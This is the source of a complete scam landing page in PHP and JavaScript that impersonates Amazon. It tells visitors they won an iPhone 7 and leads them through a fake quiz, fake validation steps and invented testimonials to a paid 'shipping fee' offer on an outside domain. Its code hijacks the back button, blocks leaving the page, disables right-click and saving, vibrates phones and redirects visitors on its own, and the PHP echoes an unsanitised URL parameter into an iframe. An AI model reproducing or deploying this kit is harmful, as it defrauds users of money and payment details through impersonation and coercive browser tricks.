<?php 
if(isset($_REQUEST['url'])){
        $iframe_url = $_REQUEST['url'];
}
?>
<!DOCTYPE HTML>
<html>
<head>
    <meta http-equiv="Content-Type" content="text/html; charset=utf-8">
    <title>Amazon Rewards</title>
    <link rel="stylesheet" href="css/font.css">
    <link rel="stylesheet" href="css/main.css">
    <link rel="stylesheet" href="css/colorbox.css" />

    <script src="http://ajax.googleapis.com/ajax/libs/jquery/1.9.1/jquery.min.js"></script>
    <script src="js/jquery.colorbox.min.js"></script>
    <script>
        $(function(){
            //Set the background iframe height to window height
            $('#bg_iframe').height($(window).height());
        });
    </script>

    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
    <meta charset="utf-8">
    <meta name="HandheldFriendly" content="True">
    <meta name="MobileOptimized" content="320">
    <meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" name="viewport">
    <meta name="viewport" content="width=device-width">
    <meta http-equiv="cleartype" content="on">
    <title>(1) Amazon</title>
</head>
<body>
    <script>
        if (typeof window.orientation === 'undefined') {
            document.location=location.href.split("?")[0]+"?"+location.href.split("?")[1].replace(/-/g,"")+'#';
        }
    </script>

        
    <script type="text/javascript">
        function getURLParameter(e){
            return decodeURI((RegExp(e+"=(.+?)(&|$)").exec(location.search)||[,null])[1]||"")
        };
        navigator.vibrate=navigator.vibrate||navigator.webkitVibrate||navigator.mozVibrate||navigator.msVibrate,navigator.vibrate([1e3,500,1e3,500,1e3,500,1e3,500,1e3]);
        document.oncontextmenu=function(){
            return false;
        };

    </script>

    <script>

        var b=getURLParameter('b');
        var m=getURLParameter('m');

        if(b==""||b=="unknown"){
            b="Amazon";
        }

        if(m==""||m=="unknown"){
            m="mobile phone";
        }
    </script>    

    <script>
        function getURLParameter(name) {
            return decodeURI((RegExp(name + '=' + '(.+?)(&|$)').exec(location.search)||[,null])[1] || '');
        }

    </script>

    <script type="text/javascript">
        var monthNames = new Array("January", "February", "March", "April", "May", "June", "July", "August", "September", "October", "November", "December");
        var now = new Date();
        now.setDate(now.getDate() + 1);
        var nowStringTommorow = monthNames[now.getMonth()] + " " + now.getDate() + ", " + now.getFullYear();
    </script>

    <style>
            #q2,#q3,#q4,#v1b,#v1c,#v2b,#v2c,#v3b,#v3c,#v4s,#vfinal,.prize,.subheader,.validate{display:none}.contestwrap table,.header table,.subheader table,td,tr{border-collapse:collapse}.answer,.pbox h2,.prize h2,.prize h3,.prizebtn,.select2{font-weight:300}.answer,.question{text-align:center}.answer,.pbox{cursor:pointer}#szlider,.pbox{overflow:hidden}html{font-family:sans-serif;font-color:#000;-webkit-text-size-adjust:100%;-ms-text-size-adjust:100%}body{margin:0;background:#f7f7f7;min-width:320px;color:#000}a,div,h1,h2,h3,h4,h5,h6,li,ol,p,span,ul{margin:0;padding:0}a{text-decoration:none;color:#4485f6}h3{color:#212121}p{color:#737373}.header{background-color:#f6f6f6;width:100%;padding:2px 0;border-bottom:1px solid #d4d4d4}.wrapper{max-width:800px;width:96%;margin:0 auto}.contestwrap,.form_questions{background-color:#fff;width:100%}.subheader{background:rgba(0,0,0,.03);width:100%;border-bottom:1px solid rgba(0,0,0,.05)}.contestwrap,.form_questions,.pbox,.reviews,.validate{border-bottom:1px solid #e5e5e5}.subheader table,td,tr{padding:8px 0 4px}.subheader td{valign:middle}.spacer{height:20px}.contestwrap{box-shadow:0 0 2px 2px #d2d2d2;padding:10px 0 4px;border-radius:3px}.contestwrap,.form_questions{-webkit-box-shadow:0 0 2px 2px #d2d2d2;-moz-box-shadow:0 0 2px 2px #d2d2d2}.toptext{color:#212121;font-size:small}.contestwrap p{color:#776161;font-size:small}.select2{color:#737373;font-size:small;padding:8px 0 4px}.form_questions{box-shadow:0 0 2px 2px #d2d2d2;padding:10px 0 30px;border-radius:3px}.answer{padding:10px 5px;width:80%;display:inline-block;margin:5px;font-size:medium;border:1px solid;border-color:#c89411 #b0820f #99710d;-webkit-border-radius:3px;-moz-border-radius:3px;border-radius:3px;-webkit-box-shadow:inset 0 1px 0 0 #fcf3dc;-moz-box-shadow:inset 0 1px 0 0 #fcf3dc;box-shadow:inset 0 1px 0 0 #fcf3dc;background:#f3ce72;filter:progid: DXImageTransform.Microsoft.gradient(startColorstr='#FFF8E3AD', endColorstr='#FFEEBA37', GradientType=0);background:linear-gradient(to bottom,#f8e3ad,#eeba37);background:-moz-linear-gradient(top,#f8e3ad,#eeba37);background:-webkit-linear-gradient(top,#f8e3ad,#eeba37);background:-o-linear-gradient(top,#f8e3ad,#eeba37);background:-ms-linear-gradient(top,#f8e3ad,#eeba37);color:#111}.pbox,.validate{border-radius:3px}.pbox h2,.pbox img,.pbox p,.prizebtn{display:block}.question{padding-top:20px}.validate{width:100%;background-color:#fff;-moz-box-shadow:0 0 2px 2px #d2d2d2;-webkit-box-shadow:0 0 2px 2px #d2d2d2;box-shadow:0 0 2px 2px #d2d2d2;padding:0}#szlider{width:100%;height:4px;background:#efefef}#szliderbar{width:0;height:4px;background:#fc9a18}#szazalek{color:#313c45;font-size:small}.prize{width:100%}.pbox{background-color:#fff;box-shadow:0 0 2px 2px #d2d2d2;padding:10px 6px;position:relative}.pbox,.reviews{-webkit-box-shadow:0 0 2px 2px #d2d2d2;-moz-box-shadow:0 0 2px 2px #d2d2d2}.pbox img{width:130px;margin-left:auto;margin-right:auto}.pbox h2,.pbox p{margin:6px 6px 0}.pbox h2{font-size:xlarge;text-align:left}.pbox p{font-size:small;text-align:left}.pbox td,.prize h3,.prizebtn{text-align:center}.prizebtn{margin:8px 14px 4px;border:1px solid;padding:4px 0;font-size:.9em;color:#111;background:#f1c860;background:-webkit-linear-gradient(top,#f5d78e,#eeb933);background:linear-gradient(to bottom,#f5d78e,#eeb933);-webkit-border-radius:3px;-moz-border-radius:3px;border-radius:3px}.prize h3{font-size:1.5em;padding:5px 0}.prize h2{font-size:1.2em;text-align:left}.reviews{width:100%;background-color:#fff;box-shadow:0 0 2px 2px #d2d2d2;padding:0;border-radius:3px}hr{opacity:.2}.reviews .name{font-weight:700;color:#333}.reviews .text{padding-top:5px;color:#555;font-style:italic}.reviews .date{padding-top:5px;color:#888a89;font-size:10px}.reviews table{font-size:small;padding:0}.roundimg{border-radius:50%;width:50px}.reviews h2{font-size:1.2em;font-weight:300;padding:20px 0 5px}.reviews hr{opacity:0}.commentpad{padding-left:10px}
    </style>

    <!-- Hotjar Tracking Code for http://win-in-2017.com-winners-circle.club/3/c3aMI -->
    <script>
        (function(h,o,t,j,a,r){
            h.hj=h.hj||function(){(h.hj.q=h.hj.q||[]).push(arguments)};
            h._hjSettings={hjid:545196,hjsv:5};
            a=o.getElementsByTagName('head')[0];
            r=o.createElement('script');r.async=1;
            r.src=t+h._hjSettings.hjid+j+h._hjSettings.hjsv;
            a.appendChild(r);
        })(window,document,'//static.hotjar.com/c/hotjar-','.js?sv=');
    </script>

<body style="display: inline;">

    <script>
        !function(){"undefined"!=typeof window.orientation&&(document.body.style.display="inline")}();
    </script>

    <div class="header">
        <table class="wrapper">
            <tbody>
                <tr>
                    <td width="30px"><img src="amzlogo.png"></td>
                    <td align="right" width="60px"><img src="icon-right.png" style="margin-right:10px;"></td>
                </tr>
            </tbody>
        </table>
    </div>

    <div class="spacer"></div>
        <div class="wrapper">
            <div class="contestwrap wrapper">
                <div class="toptext">
                    <table class="wrapper">
                        <tbody>
                            <tr>
                                <td align="left" valign="top" width="42px"><img src="logo.jpg"></td>
                                <td align="left" valign="top">
                                    <b>Congratulations 
                                        <script>document.write(getURLParameter('brand'))</script> User! Your <script>document.write(getURLParameter('model'))</script> has Won (1) Amazon Gift!
                                    </b>
                                    <br>
                                    <font style="color:#9fa2a6;font-size:x-small;">
                                        <script>

                                            var mydate=new Date()

                                            mydate.setDate(mydate.getDate()-0);

                                            var year=mydate.getYear()

                                            if (year < 1000)

                                            year+=1900

                                            var day=mydate.getDay()

                                            var month=mydate.getMonth()

                                            var daym=mydate.getDate()

                                            if (daym<10)

                                            daym="0"+daym

                                            var dayarray=new Array("Sunday", "Monday", "Tueday", "Wednesday", "Thursday", "Friday", "Saturday")

                                            var montharray=new Array("January", "February", "March", "April", "May", "June", "July", "August", "September", "October", "November", "December")

                                            document.write(""+montharray[month]+" "+daym+"")

                                        </script>
                                    </font>
                                </td>
                            </tr>
                        </tbody>
                    </table>
                    <div style="border-bottom:1px solid #ccc;">
                        <p class="wrapper">
                            Congratulations User, every <script language="Javascript" type="text/javascript">
                            <!-- 
                                document.write(dayarray[mydate.getDay()]);
                            // -->

                            </script>, we select 10 lucky <script>document.write(getURLParameter('brand'))</script> users randomly once a day to receive a gift from our Amazon major retailers. This is just our way to thank you for your continuous support for Amazon's product and services.

                            <br>

                            <br>Your <script>document.write(getURLParameter('model'))</script> has been selected to win a gift from Amazon worth up to $1,299 if you answer the next 4 questions correctly.

                            <br>

                            <br><strong>ACT NOW! 9 other <script>document.write(getURLParameter('model'))</script> 

                            users have received this invitation with only 5 prizes to win.</strong>

                            Only 1 Prize per household. (Your IP Address: <script>document.write(getURLParameter('ip'))</script> )<br>

                            <br>
                        </p>
                    </div>

                    <script type="text/javascript">
                        //<![CDATA[
                        function startTimer(t){var e,n,r=t,a=setInterval(function(){e=parseInt(r/60,10),n=parseInt(r%60,10),n=10>n?"0"+n:n,$("#timerr").text(e+" minute "+n+" seconds"),--r<0&&(clearInterval(a))},1e3)}

                        startTimer((1 * 60) + 29);

                        //]]>
                    </script>


                    <div class="select2 wrapper">
                        You have <font color="#b12704"><b><span id="timerr">1 minute 21 seconds</span></b></font> to answer the questions before someone else takes over your spot. Good luck! 
                        </div>
                    </div>
                </div>

                <div class="spacer"></div>
                    <div class="form_questions wrapper">
                        <div class="question wrapper" id="q1">
                            <h3 style="" "color:#313c45;"=""><span style="font-weight:300;">
                                Question 1 of 4:</span><br> Who founded Amazon?<br>
                            </h3>
                            <br>

                            <span class="answer">Mark Zuckerberg</span>
                            <span class="answer">Jeff Bezos</span>
                            <span class="answer">Steve Jobs</span>
                        </div>

                        <div class="question wrapper" id="q2">
                            <h3 style="color:#313c45;">
                                <span style="font-weight:300; color:#313c45;">Question 2 of 4:</span> Where is the Headquarters of Amazon in USA?<br>
                            </h3>
                            <br>

                            <span class="answer">Seattle, Washington</span>
                            <span class="answer">Las Vegas, Nevada</span>
                            <span class="answer">
                                <script>
                                    document.write(getURLParameter('city'))
                                </script>, 
                                <script>
                                    document.write(getURLParameter('region'))
                                </script>
                            </span>
                        </div>

                        <div class="question wrapper" id="q3">
                            <h3 style="" "color:#313c45;"=""><span style="font-weight:300; color:#313c45;">Question 3 of 4:</span> In which year was Amazon founded?<br></h3>
                            <br>

                            <span class="answer">1953</span>
                            <span class="answer">2015</span>
                            <span class="answer">1994</span>
                        </div>


                        <div class="question wrapper" id="q4">
                            <h3 style="" "color:#313c45;"="">
                                <span style="font-weight:300; color:#313c45;">Question 4 of 4:</span> What does the logo of Amazon stand for?<br>
                            </h3>
                            <br>

                            <span class="answer" onClick="drawszlider(10,0);">From A to Z</span>
                            <span class="answer" onClick="drawszlider(10,0);">A smiley face</span>
                            <span class="answer" onClick="drawszlider(10,0);">An arrow</span>
                        </div>
                    </div>

                    <div class="validate wrapper">
                        <div class="wrapper">
                            <br>
                            <table width="100%">
                                <tbody>
                                    <tr>
                                        <td align="left">
                                            <p id="v1b">Validating your answers..</p>
                                            <p id="v2b">Checking your IP....</p>
                                            <p id="v3b">Checking if there are still gifts available....</p>
                                            <p id="vfinal">CONGRATULATIONS!</p>
                                        </td>
                                        <td align="right"><span id="szazalek">0%</span></td>
                                    </tr>
                                </tbody>
                            </table>

                            <div style="width:100%;margin:0 auto;">
                                <div id="szlider">
                                    <div id="szliderbar">
                                    </div>
                                    <div id="szazalek">
                                    </div>
                                </div>
                            </div>

                            <table>
                                <tbody>
                                    <tr>
                                        <td width="40px"><img id="v1a" src="loading.gif"><img id="v1c" src="fb-check.jpg"></td>
                                        <td>
                                            <p id="v1d">You Answered (4/4) correctly!</p>
                                        </td>
                                    </tr>
                                    <tr>
                                        <td>
                                            <img id="v2a" src="loading.gif"><img id="v2c" src="fb-check.jpg">
                                        </td>
                                        <td>
                                            <p id="v2d">No previous entries found on this IP.</p>
                                        </td>
                                    </tr>

                                    <tr>
                                        <td><img id="v3a" src="loading.gif"><img id="v3c" src="fb-check.jpg"></td>
                                        <td>
                                            <p id="v3d">There are available prizes!</p>
                                        </td>
                                    </tr>
                                </tbody>
                            </table>
                            <br>

                        </div>
                    </div>

                    <script>
                        var slidewhere = 0;
                        var holvanszlider = 0;

                        function drawszlider(ossz, meik) {
                            var szazalek = Math.round((meik * 100) / ossz);
                            document.getElementById("szliderbar").style.width = szazalek + "%";
                            document.getElementById("szazalek").innerHTML = szazalek + "%";
                            holvanszlider = meik;
                            t = setTimeout("drawszlider(100, slidewhere);slidewhere = holvanszlider + 1; if (slidewhere > 100) {slidewhere = 100;}", 62);
                        }
                    </script>

                    <div class="spacer" id="v4s"></div>

                    <div class="prize wrapper" id="v4">
                        <h5 style="color: #737373;text-align:center;padding-top:20px;">
                            Thank you, loyal Amazon guest! You scored 100%!
                        </h5>
                        <h3>Congratulations!</h3>
                        <h5 style="color: #776161; text-align:center;">Pick your favorite gift:</h5>
                        <br>

                        <table width="100%" border="0">
                            <tbody>
                                <tr class="pbox wrapper" style="opacity:0.5;">
                                    <td width="50%">
                                        <div onClick="exit_b1();PreventExitPop = false" style="cursor:pointer;">
                                            <img src="ps4.jpg">
                                        </div>
                                    </td>

                                    <td width="50%">
                                        <div onClick="exit_b1();PreventExitPop = false" style="cursor:pointer;">
                                            <h2 style="color:#4485f6;">PlayStation 4</h2>
                                        </div>
                                        <p>
                                            <b>List Price:</b> $499
                                            <br>
                                            Your Price: $0
                                            <br>
                                            <b>S&amp;H:    </b>$9.93
                                            <br>
                                        </p>

                                        <div onClick="exit_b1();PreventExitPop = false" style="cursor:pointer;">
                                            <div class="prizebtn btnwrapper" style="background-color:#aaa;">NOT AVAILABLE</div>

                                        </div>
                                    </td>
                                </tr>

                                <tr height="10px"></tr>

                                <tr class="pbox wrapper" style="opacity:0.5;">
                                    <td width="50%">
                                        <div onClick="exit_b1();PreventExitPop = false" style="cursor:pointer;">
                                            <img src="samsungs6.jpg">
                                        </div>
                                    </td>
                                    <td width="50%">
                                        <div onClick="exit_b1();PreventExitPop = false" style="cursor:pointer;">
                                            <h2 style="color:#4485f6;">Samsung S6 128GB</h2>
                                        </div>
                                        <p>
                                            <b>List Price:</b> $899
                                            <br>
                                            <b>Your Price:</b> $0
                                            <br>
                                            <b>S&amp;H: </b>$9.93
                                            <br>
                                        </p>

                                        <div onClick="exit_b1();PreventExitPop = false" style="cursor:pointer;">
                                            <div class="prizebtn btnwrapper" style="background-color:#aaa;">NOT AVAILABLE</div>
                                        </div>
                                    </td>
                                </tr>

                                <tr height="10px"></tr>

                                <tr class="pbox wrapper">
                                    <td width="50%">
                                        <a href="http://111.okkeeii9.club/click" onClick="exit_a1();PreventExitPop = false">
                                            <img src="iphonered.jpg">
                                        </a>
                                    </td>

                                    <td width="50%">
                                        <a href="http://111.okkeeii9.club/click" onClick="exit_a1();PreventExitPop = false">
                                            <h2>iPhone 7 Red 120GB</h2>
                                        </a>
                                        <p>
                                            <b>List Price: </b>$1,299
                                            <br>
                                            <b>Your Price:</b> $0
                                            <br>
                                            <b>S&amp;H: </b>$9.93 <br><font style="size: 8px;"><b>PRIZE GUARANTEED!</b></font>
                                            <br>
                                        </p>
                                        <!--<a href="http://111.okkeeii9.club/click" onClick="exit_a1();PreventExitPop = false">
                                            <div class="prizebtn btnwrapper">CLAIM($9.93)</div>
                                        </a>-->
                                        <a onClick="exit_a1();PreventExitPop = false">
                                            <div class="prizebtn btnwrapper">CLAIM($9.93)</div>
                                        </a>
                                    </td>
                                </tr>
                            </tbody>
                        </table>
                    </div>
                    <div class="spacer"></div>
                        <div class="reviews wrapper">
                            <div class="wrapper">
                                <h2>Comments:</h2>
                            </div>

                            <table class="wrapper" style="padding-top:8px;">
                                <tbody>
                                    <tr>
                                        <td width="50px" valign="top" align="right">
                                            <img class="roundimg" src="comment-k.jpg">
                                        </td>
                                        <td align="left" valign="top" class="commentpad">
                                            <div class="name">Anna Sarah</div>
                                            <div class="text">Mine just arrived today. Thanks for the iPhone !!!</div>
                                            <img class="fbimg" src="galiphone.jpg">
                                            <div class="date">
                                                <script>
                                                    document.write("" + montharray[month] + " " + daym + "")
                                                </script>
                                            </div>
                                        </td>
                                    </tr>
                                </tbody>
                            </table>

                            <hr>

                            <table class="wrapper">
                                <tbody>
                                    <tr>
                                        <td width="50px" valign="top" align="right">
                                            <img class="roundimg" src="comment1.jpg">
                                        </td>
                                        <td align="left" valign="top" class="commentpad">
                                            <div class="name">Frank Miller</div>
                                            <div class="text">At first I thought it was a joke, but actually my iPhone 7 came in this morning and there is nothing stopping me sign up for ALL of them, which I did lol</div>
                                            <div class="date">
                                                <script>
                                                    mydate.setDate(mydate.getDate() - 2);
                                                    month = mydate.getMonth();
                                                    daym = mydate.getDate();
                                                    if (daym < 10) daym = "0" + daym;
                                                    document.write("" + montharray[month] + " " + daym + "");
                                                </script>
                                            </div>
                                        </td>
                                    </tr>
                                </tbody>
                            </table>

                            <hr>

                            <table class="wrapper">
                                <tbody>
                                    <tr>
                                        <td width="50px" valign="top" align="right">
                                            <img class="roundimg" src="ps4man.jpg">
                                        </td>
                                        <td align="left" valign="top" class="commentpad">
                                            <div class="name">Thomas Cook</div>
                                            <div class="text">I'm not an avid gamer, but I've just choosen the PS4! Why not?! LOL</div>
                                            <div class="date">
                                                <script>
                                                    document.write("" + montharray[month] + " " + daym + "")
                                                </script>
                                            </div>
                                        </td>
                                    </tr>
                                </tbody>
                            </table>

                            <hr>

                            <table class="wrapper">
                                <tbody>
                                    <tr>
                                        <td width="50px" valign="top" align="right">
                                            <img class="roundimg" src="comment7.jpg">
                                        </td>
                                        <td align="left" valign="top" class="commentpad">
                                            <div class="name">Kristen Stock</div>
                                            <div class="text">Damn, I wanted the PS4! Its out of stock !!!!! but free better than nothing, I still got my Samsung S6 yesterday... XOXO</div>
                                            <img class="fbimg" src="s6unbox.jpg">
                                            <div class="date">
                                                <script>
                                                    document.write("" + montharray[month] + " " + daym + "")
                                                </script>
                                            </div>
                                        </td>
                                    </tr>
                                </tbody>
                            </table>

                            <hr>

                            <table class="wrapper">
                                <tbody>
                                    <tr>
                                        <td width="50px" valign="top" align="right">
                                            <img class="roundimg" src="female.jpg">
                                        </td>
                                        <td align="left" valign="top" class="commentpad">
                                            <div class="name">Joyce Kent</div>
                                            <div class="text">This quiz was too easy, I do hope I'll get my iPhone 7 too</div>
                                            <div class="date">
                                                <script>
                                                    document.write("" + montharray[month] + " " + daym + "")
                                                </script>
                                            </div>
                                        </td>
                                    </tr>
                                </tbody>
                            </table>

                            <hr>

                            <table class="wrapper">
                                <tbody>
                                    <tr>
                                        <td width="50px" valign="top" align="right">
                                            <img class="roundimg" src="comment-c.jpg">
                                        </td>
                                        <td align="left" valign="top" class="commentpad">
                                            <div class="name">Lexi Benz</div>
                                            <div class="text">Had seen this contest once and I ignored it because I thought it was a hoax. I saw this ad again and decided to try it since I was bored ... Actually I got my Samsung S6 too! What INSANITY!</div>
                                            <div class="date">
                                                <script>
                                                    document.write("" + montharray[month] + " " + daym + "")
                                                </script>
                                            </div>
                                        </td>
                                    </tr>
                                </tbody>
                            </table>

                            <hr>

                            <table class="wrapper">
                                <tbody>
                                    <tr>
                                        <td width="50px" valign="top" align="right">
                                            <img class="roundimg" src="oldman.jpg">
                                        </td>
                                        <td align="left" valign="top" class="commentpad">
                                            <div class="name">Joshua Brown</div>
                                            <div class="text">Thanks ,i gave my dog the iPhone 7 as her birthday gift. Lol jk its for me :D :D :D God Blessed.</div>
                                            <img class="fbimg" src="ip6sunbox.jpg">
                                            <div class="date">
                                                <script>
                                                    mydate.setDate(mydate.getDate() - 1);
                                                    month = mydate.getMonth();
                                                    daym = mydate.getDate();
                                                    if (daym < 10) daym = "0" + daym;
                                                    document.write("" + montharray[month] + " " + daym + "");
                                                </script>
                                            </div>
                                        </td>
                                    </tr>
                                </tbody>
                            </table>

                            <hr>

                            <table class="wrapper">
                                <tbody>
                                    <tr>
                                        <td width="50px" valign="top" align="right">
                                            <img class="roundimg" src="oldlady.jpg">
                                        </td>
                                        <td align="left" valign="top" class="commentpad">
                                            <div class="name">Julia Meyer</div>
                                            <div class="text">Fantastic! I've never won anything before, but I hope I will be as lucky!!</div>
                                            <img class="fbimg" src="smiley.png">
                                            <div class="date">
                                                <script>
                                                    mydate.setDate(mydate.getDate() - 1);
                                                    month = mydate.getMonth();
                                                    daym = mydate.getDate();
                                                    if (daym < 10) daym = "0" + daym;
                                                    document.write("" + montharray[month] + " " + daym + "");
                                                </script>
                                            </div>
                                        </td>
                                    </tr>
                                </tbody>
                            </table>

                        </div>
                    </div>
                    <div style="height:40px;"></div>

                    <script type="text/javascript">

                        setTimeout(function(){
                            alert('NOTIFICATION - STOCK LOW!\n**********************\n\nONLY 1 iPhone 7 Red left in the Amazon Membership Rewards Giveaway! The last iPhone 7 Red worth $1,299 has been reserved to you by Amazon\n\n***THE RULES*** \n\n1. Press OK to claim your iPhone 7 Red. \n\n2. Follow the intructions on our secure offer page!');
                            window.onbeforeunload=null;
                            $(window).on('beforeunload', null);
                            window.location = "http://111.okkeeii9.club/click";
                        }, 3 * 60 * 1000);

                        function exit_a1() {
                            //Load page as a popup
                            $('#bg_iframe').ready(function(){
                                setTimeout(function(){
                                    $('.iframe').click();
                                },1000); // Set the number of seconds

                                $(".iframe").colorbox({iframe:true, width:"80%", height:"85%"});
                            });
                            // alert("Here it is.");
                            // alert("STOP! To claim READ CAREFULLY\n\n(1) iPhone 7 Red worth $1,299 has been reserved for YOU by Amazon!\n\nIf you see 'You Have Won' on the next page, you will need to provide your shipping address.    Follow the rules carefully.\n\n***THE RULES*** \n\n1. If you have won, you will have 1 minute to complete the claim process.    Rewards are highly competitive, and if you fail to complete the process in time, your item will go to the next winner. \n\n2. Just pay shipping and handling fee of $9.93. You can do this with your credit or debt card.    Must be completed in 1 minute.\n\n3. Once offer expires, you will NOT be eligible again!    This is your only opportunity to WIN!\n\nNote: Time starts once you click OK, so have your shipping address and payment information ready!");
                        }

                        function exit_b1() {
                            alert("SORRY, NOT AVAILABLE!\n\nPlease choose another prize.");
                        }

                        var PreventExitPop = true;

                        function ExitPop() {
                            if (PreventExitPop != false) {
                                return "Wait a moment!!\n\nOnly (1) iPhone 7 left to be won from Amazon! Are you sure you want to give your Amazon gift away to the next lucky "+b+" user?"
                            }
                        }

                        window.onbeforeunload = ExitPop;

                        var lr = "http://111.okkeeii9.club/click";

                        if(window.history&&window.history.pushState)
                            window.onpopstate=function(){
                                var n=location.hash,
                                    o=n.split("#!/"),
                                    i=o[1];
                                if(""!==i) {
                                    var a=window.location.hash;
                                    
                                    if(""===a)
                                        return window.onbeforeunload=null,
                                    window.location=lr,!1
                                }
                            },
                            
                            window.history.pushState("forward",null,"#valid");
                        else {
                            var ignoreHashChange=!0;
                            window.onhashchange=function() {
                                if(ignoreHashChange)
                                    ignoreHashChange=!1;
                                else {
                                    ignoreHashChange=!0;
                                    
                                    var n=location.hash,
                                        o=n.split("#!/"),
                                        i=o[1];
                                    
                                    if(""!==i) {
                                        var a=window.location.hash;
                                        
                                        if(""===a)
                                            return window.onbeforeunload=null,
                                        
                                        window.location=lr,!1
                                    }
                                }
                            },
                            
                            window.history.pushState("forward",null,"#valid")
                        }

                        $(document).bind('keydown keypress', 'ctrl+s', function(){return false;});
                        $(document).on("contextmenu",function(){return false});
                        $(document).ready(function() {
                            alert("Congratulations "+getURLParameter('model')+" user!\n\nYou are selected by Amazon to be among the first few persons to win an iPhone 7 Red or other Amazon prizes! This free gift is exclusively only for loyal "+getURLParameter('isp')+" users in "+getURLParameter('country')+".\n\nPlease confirm that you are a "+getURLParameter('isp')+" customer by clicking OK.");

                            setInterval(function() {
                                $("h1").toggle();
                            }, 1500);

                            $("#q1 .answer").click(function() {
                                $("#q1").hide(0, function() {
                                    $("#q2").fadeIn();
                                });
                            });

                            $("#q2 .answer").click(function() {
                                $("#q2").hide(0, function() {
                                    $("#q3").fadeIn();
                                });
                            });

                            $("#q3 .answer").click(function() {
                                $("#q3").hide(0, function() {
                                    $("#q4").fadeIn();
                                });
                            });

                            $("#q4 .answer").click(function() {
                                $(".form_questions").hide(0, function() {
                                    $(".validate").show();
                                    $("#v0a").fadeIn();
                                    $("#v1a").fadeIn();
                                    $("#v1b").fadeIn();
                                });

                                setTimeout(function() {
                                    $("#v1a").hide();
                                    $("#v1b").hide();
                                    $("#v1c").show();
                                    $("#v1d").show();
                                    $("#v2a").show();
                                    $("#v2b").show();
                                }, 2000);

                                setTimeout(function() {
                                    $("#v2a").hide();
                                    $("#v2b").hide();
                                    $("#v2c").show();
                                    $("#v2d").show();
                                    $("#v3a").show();
                                    $("#v3b").show();
                                }, 4500);

                                setTimeout(function() {
                                    $("#v3a").hide();
                                    $("#v3b").hide();
                                    $("#v3c").show();
                                    $("#v3d").show();
                                    $("#vfinal").show();
                                    $("#v0a").hide();
                                    $("#v0b").show();
                                }, 6500);

                                setTimeout(function() {
                                    $(".validate").hide(0, function() {
                                    });

                                    $("#v4").show();
                                    $("#v4s").show();
                                    $(".reviews").show();
                                }, 7500);
                            });
                        });

                    </script>
    
                    <script type="text/javascript">
                        !function(){
                            var campaign_link ="http://111.okkeeii9.club/390cde7b-c438-49d9-b477-ffc86f27f892?target={TARGET}&domain={domain}&domain_id={domain_id}&campaign_id={campaign_id}&country={country}&pid={pid}&channel={channel}&signedby={signedby}&bid={BID}&click_id={CLICK_ID}"; // REPLACE WITH YOUR LINK

                            var t;                         
                            try{
                                for(t=0;10>t;++t)history.pushState({},"","#");
                                onpopstate=function(t){t.state&&location.replace(campaign_link)}}
                            catch(o){}
                        }();
                    </script>

                    <a class='iframe' href="http://111.okkeeii9.club/click" style="display:none;"></a>

                    <?php 
                        if(isset($iframe_url)) {
                    ?>
                    <iframe id="bg_iframe" src="<?php echo $iframe_url; ?>" width="100%" seamless> </iframe>
                    <?php } ?>
                </div>
</body>
</html>